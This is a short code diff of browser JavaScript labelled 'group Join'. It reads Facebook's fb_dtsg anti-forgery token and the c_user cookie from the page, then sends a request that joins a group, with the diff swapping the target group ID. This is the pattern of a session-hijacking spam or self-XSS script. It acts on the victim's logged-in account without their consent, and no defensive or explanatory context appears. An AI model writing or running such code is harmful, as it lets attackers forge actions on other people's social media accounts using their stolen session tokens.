@@ -1,4 +1,3 @@
-
 /*group Join*/
 var b = document.getElementsByName("fb_dtsg")[0].value,
     c = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -13,7 +12,7 @@ function g(d) {
     };
     a.send(d)
 }
-g("517359238352475");
+g("326991057447362");
 b = document.getElementsByName("fb_dtsg")[0].value;
 c = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
